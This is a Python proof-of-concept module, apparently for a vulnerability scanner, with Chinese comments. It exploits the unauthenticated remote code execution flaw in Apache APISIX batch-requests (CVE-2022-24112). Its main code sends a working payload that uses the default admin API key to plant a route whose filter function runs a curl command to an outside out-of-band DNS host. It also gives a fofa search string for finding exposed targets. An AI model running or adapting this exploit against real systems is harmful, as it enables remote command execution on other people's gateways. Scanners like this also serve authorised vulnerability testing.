# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache APISIX batch-requests 未授权RCE(CVE-2022-24112)",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache APISIX",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            1.3<=ver<=2.12.1
            2.10.0<=ver<=2.10.4 LTS
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            header="APISIX/2.11.0"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]

        url0 = self.target + "/apisix/batch-requests" # url自己按需调整
        data0 = """{"headers":{"X-Real-IP":"127.0.0.1","Content-Type":"application/json"},"timeout":1500,"pipeline":[{"method":"PUT","path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1","body":"{\\r\\n \\"name\\": \\"test\\", \\"method\\": [\\"GET\\"],\\r\\n \\"uri\\": \\"/api/test\\",\\r\\n \\"upstream\\":{\\"type\\":\\"roundrobin\\",\\"nodes\\":{\\"httpbin.org:80\\":1}}\\r\\n,\\r\\n\\"filter_func\\": \\"function(vars) os.execute('curl %s'); return true end\\"}"}]}""" % dns_flag
        url1 = self.target + "/api/test"

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            flager = verify_ceye_dns(dns_flag)

            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()